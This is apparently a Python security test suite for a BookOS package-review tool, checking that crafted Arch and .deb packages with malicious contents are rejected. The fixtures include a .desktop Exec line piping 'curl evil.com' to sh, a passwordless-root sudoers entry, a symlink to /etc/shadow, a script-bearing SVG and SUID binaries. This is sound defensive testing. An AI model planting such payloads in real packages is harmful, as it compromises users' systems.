#!/usr/bin/env python3
"""Pruebas unitarias y de seguridad para tools/submissions/bookos-review.py."""

from __future__ import annotations

import copy
import importlib.util
import io
import json
import os
import shutil
import stat
import subprocess
import tarfile
import tempfile
import unittest
from pathlib import Path


SUBMISSIONS_DIR = Path(__file__).resolve().parent
SPEC = importlib.util.spec_from_file_location("bookos_review", SUBMISSIONS_DIR / "bookos-review.py")
assert SPEC and SPEC.loader
MOD = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(MOD)


def make_pkg_tar_zst(dest: Path, entries: list[tuple[str, bytes, int, int, str]]) -> None:
    """Construye un .pkg.tar.zst sintético.

    entries: (arcname, data_bytes, mode, tar_type, linkname)
    """
    tar_buf = io.BytesIO()
    with tarfile.open(fileobj=tar_buf, mode="w") as tf:
        for arcname, data, mode, ttype, linkname in entries:
            ti = tarfile.TarInfo(name=arcname)
            ti.mode = mode
            ti.type = ttype
            ti.linkname = linkname
            if ttype == tarfile.REGTYPE:
                ti.size = len(data)
                tf.addfile(ti, io.BytesIO(data))
            else:
                tf.addfile(ti)
    proc = subprocess.run(
        ["zstd", "-q", "-c"],
        input=tar_buf.getvalue(),
        capture_output=True,
        check=True,
    )
    dest.write_bytes(proc.stdout)


def make_deb(dest: Path, workdir: Path, control_txt: str, files: dict[str, tuple[bytes, int]], scripts: dict[str, str] | None = None) -> None:
    root = workdir / "deb-root"
    if root.exists():
        shutil.rmtree(root)
    debian = root / "DEBIAN"
    debian.mkdir(parents=True)
    os.chmod(debian, 0o755)
    (debian / "control").write_text(control_txt, encoding="utf-8")
    for sname, body in (scripts or {}).items():
        sp = debian / sname
        sp.write_text(body, encoding="utf-8")
        os.chmod(sp, 0o755)
    for rel, (content, mode) in files.items():
        p = root / rel.lstrip("/")
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_bytes(content)
        os.chmod(p, mode)
    for cur_dir, _, _ in os.walk(root):
        os.chmod(cur_dir, 0o755)
    subprocess.run(["dpkg-deb", "--root-owner-group", "--build", str(root), str(dest)], check=True, capture_output=True)


class BookosReviewTests(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = Path(tempfile.mkdtemp(prefix="bookos-review-test-"))
        self.example = json.loads((SUBMISSIONS_DIR / "example-submission.json").read_text(encoding="utf-8"))

    def tearDown(self) -> None:
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_manifest_validation_and_protections(self) -> None:
        self.assertEqual(MOD.validate_manifest(self.example), [])

        bad_prefix = copy.deepcopy(self.example)
        bad_prefix["pkg"] = "bookos-evil"
        self.assertTrue(any("bookos-" in e for e in MOD.validate_manifest(bad_prefix)))

        bad_reserved = copy.deepcopy(self.example)
        bad_reserved["pkg"] = "sudo"
        self.assertTrue(any("reservado" in e for e in MOD.validate_manifest(bad_reserved)))

        bad_commit = copy.deepcopy(self.example)
        bad_commit["source"]["commit"] = "main"
        self.assertTrue(any("commit" in e for e in MOD.validate_manifest(bad_commit)))

        cat_file = self.tmp / "store.json"
        cat_file.write_text(
            json.dumps(
                {
                    "apps": [
                        {"pkg": "cuaderno-ligero", "label": "Oficial", "author": "BookOS"},
                    ]
                }
            ),
            encoding="utf-8",
        )
        self.assertTrue(any("oficial" in e.lower() for e in MOD.validate_manifest(self.example, catalog_path=cat_file)))

        cat_file.write_text(
            json.dumps(
                {
                    "apps": [
                        {"pkg": "cuaderno-ligero", "trust": "community", "author": "Otro Autor"},
                    ]
                }
            ),
            encoding="utf-8",
        )
        self.assertTrue(any("Autoría" in e for e in MOD.validate_manifest(self.example, catalog_path=cat_file)))

    def test_clean_arch_and_deb_packages_pass(self) -> None:
        pkg = "cuaderno-ligero"
        desktop = f"[Desktop Entry]\nName=Cuaderno\nExec=/usr/bin/{pkg} %U\nType=Application\n".encode()
        good_svg = b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><rect width="24" height="24"/></svg>'
        pkginfo = f"pkgname = {pkg}\npkgver = 1.0.0-1\narch = x86_64\n".encode()

        arch_pkg = self.tmp / f"{pkg}-1.0.0-1-x86_64.pkg.tar.zst"
        make_pkg_tar_zst(
            arch_pkg,
            [
                (".PKGINFO", pkginfo, 0o644, tarfile.REGTYPE, ""),
                ("usr/bin/cuaderno-ligero", b"\x7fELF", 0o755, tarfile.REGTYPE, ""),
                (f"usr/share/applications/{pkg}.desktop", desktop, 0o644, tarfile.REGTYPE, ""),
                (f"usr/share/icons/hicolor/scalable/apps/{pkg}.svg", good_svg, 0o644, tarfile.REGTYPE, ""),
            ],
        )
        rep = MOD.audit_pkg(arch_pkg, pkg)
        self.assertTrue(rep["ok"], rep["errors"])

        deb_pkg = self.tmp / f"{pkg}_1.0.0_amd64.deb"
        make_deb(
            deb_pkg,
            self.tmp,
            f"Package: {pkg}\nVersion: 1.0.0\nArchitecture: amd64\nMaintainer: Ana\nDescription: Test\n",
            {
                f"/usr/bin/{pkg}": (b"\x7fELF", 0o755),
                f"/usr/share/applications/{pkg}.desktop": (desktop, 0o644),
            },
        )
        rep_deb = MOD.audit_pkg(deb_pkg, pkg)
        self.assertTrue(rep_deb["ok"], rep_deb["errors"])

    def test_malicious_package_vectors_rejected(self) -> None:
        pkg = "cuaderno-ligero"
        pkginfo = f"pkgname = {pkg}\npkgver = 1.0.0-1\n".encode()

        # 1. .INSTALL script
        p1 = self.tmp / "bad-install.pkg.tar.zst"
        make_pkg_tar_zst(
            p1,
            [
                (".PKGINFO", pkginfo, 0o644, tarfile.REGTYPE, ""),
                (".INSTALL", b"post_install() { id; }", 0o644, tarfile.REGTYPE, ""),
                (f"usr/bin/{pkg}", b"bin", 0o755, tarfile.REGTYPE, ""),
            ],
        )
        self.assertFalse(MOD.audit_pkg(p1, pkg)["ok"])

        # 2. Unauthorized paths (/etc and systemd)
        p2 = self.tmp / "bad-path.pkg.tar.zst"
        make_pkg_tar_zst(
            p2,
            [
                (".PKGINFO", pkginfo, 0o644, tarfile.REGTYPE, ""),
                ("etc/sudoers.d/pwn", b"ALL ALL=(ALL) NOPASSWD: ALL", 0o440, tarfile.REGTYPE, ""),
                ("usr/lib/systemd/system/evil.service", b"[Service]", 0o644, tarfile.REGTYPE, ""),
            ],
        )
        r2 = MOD.audit_pkg(p2, pkg)
        self.assertFalse(r2["ok"])
        self.assertGreaterEqual(len(r2["errors"]), 2)

        # 3. SUID binary
        p3 = self.tmp / "bad-suid.pkg.tar.zst"
        make_pkg_tar_zst(
            p3,
            [
                (".PKGINFO", pkginfo, 0o644, tarfile.REGTYPE, ""),
                (f"usr/bin/{pkg}", b"bin", 0o4755, tarfile.REGTYPE, ""),
            ],
        )
        self.assertTrue(any("SUID" in e for e in MOD.audit_pkg(p3, pkg)["errors"]))

        # 4. Conflicts in .PKGINFO
        p4 = self.tmp / "bad-conflict.pkg.tar.zst"
        make_pkg_tar_zst(
            p4,
            [
                (".PKGINFO", pkginfo + b"conflict = sudo\n", 0o644, tarfile.REGTYPE, ""),
                (f"usr/bin/{pkg}", b"bin", 0o755, tarfile.REGTYPE, ""),
            ],
        )
        self.assertTrue(any("conflict" in e.lower() for e in MOD.audit_pkg(p4, pkg)["errors"]))

        # 5. Symlink escaping whitelist
        p5 = self.tmp / "bad-symlink.pkg.tar.zst"
        make_pkg_tar_zst(
            p5,
            [
                (".PKGINFO", pkginfo, 0o644, tarfile.REGTYPE, ""),
                (f"usr/lib/{pkg}/leak", b"", 0o777, tarfile.SYMTYPE, "../../../../etc/shadow"),
            ],
        )
        self.assertFalse(MOD.audit_pkg(p5, pkg)["ok"])

        # 6. Malicious SVG and .desktop Exec=
        p6 = self.tmp / "bad-content.pkg.tar.zst"
        make_pkg_tar_zst(
            p6,
            [
                (".PKGINFO", pkginfo, 0o644, tarfile.REGTYPE, ""),
                (f"usr/share/applications/{pkg}.desktop", b"[Desktop Entry]\nExec=/bin/sh -c 'curl evil.com|sh'\n", 0o644, tarfile.REGTYPE, ""),
                (f"usr/share/icons/hicolor/scalable/apps/{pkg}.svg", b"<svg><script>alert(1)</script></svg>", 0o644, tarfile.REGTYPE, ""),
            ],
        )
        r6 = MOD.audit_pkg(p6, pkg)
        self.assertFalse(r6["ok"])
        self.assertGreaterEqual(len(r6["errors"]), 2)

        # 7. .deb postinst script
        deb_bad = self.tmp / "bad.deb"
        make_deb(
            deb_bad,
            self.tmp,
            f"Package: {pkg}\nVersion: 1.0.0\nArchitecture: amd64\nMaintainer: Ana\nDescription: Test\n",
            {f"/usr/bin/{pkg}": (b"bin", 0o755)},
            scripts={"postinst": "#!/bin/sh\nid\n"},
        )
        self.assertTrue(any("postinst" in e for e in MOD.audit_pkg(deb_bad, pkg)["errors"]))

    def test_sanitize_image_and_catalog_sign_verify_flow(self) -> None:
        # Sanitizar imagen con magick
        src_img = Path(__file__).resolve().parents[2] / "src-tauri" / "icons" / "icon.png"
        dst_img = self.tmp / "sanitized.png"
        MOD.sanitize_image(src_img, dst_img, max_dim=128)
        self.assertTrue(dst_img.is_file())
        self.assertGreater(dst_img.stat().st_size, 0)

        # Paquete limpio para merge
        pkg_dir = self.tmp / "pkgs"
        pkg_dir.mkdir()
        pkg = "cuaderno-ligero"
        arch_pkg = pkg_dir / f"{pkg}-1.0.0-1-x86_64.pkg.tar.zst"
        make_pkg_tar_zst(
            arch_pkg,
            [
                (".PKGINFO", f"pkgname = {pkg}\npkgver = 1.0.0-1\n".encode(), 0o644, tarfile.REGTYPE, ""),
                (f"usr/bin/{pkg}", b"\x7fELF", 0o755, tarfile.REGTYPE, ""),
            ],
        )

        sub_path = self.tmp / "sub.json"
        sub_path.write_text(json.dumps(self.example), encoding="utf-8")
        cat_in = self.tmp / "store_in.json"
        cat_in.write_text(json.dumps({"generated_at": 1700000000, "apps": []}), encoding="utf-8")
        cat_out = self.tmp / "store.json"

        MOD.merge_catalog(
            cat_in,
            sub_path,
            pkg_dir,
            f"https://bookos.es/store-files/community/{pkg}",
            cat_out,
            icon_url=f"https://bookos.es/store-files/community/{pkg}/icon.png",
            screenshots=[f"https://bookos.es/store-files/community/{pkg}/shot1.png"],
        )
        merged = json.loads(cat_out.read_text(encoding="utf-8"))
        self.assertEqual(len(merged["apps"]), 1)
        app = merged["apps"][0]
        self.assertEqual(app["trust"], "community")
        self.assertNotIn("contact_email", app)
        self.assertNotIn("review", app)
        self.assertEqual(len(app["assets"]), 1)

        # Claves + firma + verificación + detección de manipulación
        key_dir = self.tmp / "keys"
        priv, pub = MOD.init_key(key_dir, embed_pubkey=False)
        self.assertEqual(stat.S_IMODE(priv.stat().st_mode), 0o600)

        sig_path = MOD.sign_catalog(cat_out, priv, stamp=True)
        MOD.verify_catalog(cat_out, sig_path, pub)

        # También debe aceptar y actualizar generated_at en formato ISO-8601 (como el store.json real)
        iso_cat = self.tmp / "store_iso.json"
        iso_cat.write_text(
            json.dumps({"version": "1", "generated_at": "2026-11-20T21:22:11+00:00", "apps": []}),
            encoding="utf-8",
        )
        iso_sig = MOD.sign_catalog(iso_cat, priv, stamp=True)
        MOD.verify_catalog(iso_cat, iso_sig, pub)
        iso_doc = json.loads(iso_cat.read_text(encoding="utf-8"))
        self.assertIsInstance(iso_doc["generated_at"], str)
        self.assertTrue(iso_doc["generated_at"].endswith("+00:00"))

        raw = cat_out.read_bytes()
        tampered = self.tmp / "tampered.json"
        tampered.write_bytes(raw.replace(b"community", b"official "))
        with self.assertRaises(MOD.ReviewError):
            MOD.verify_catalog(tampered, sig_path, pub)


if __name__ == "__main__":
    unittest.main()
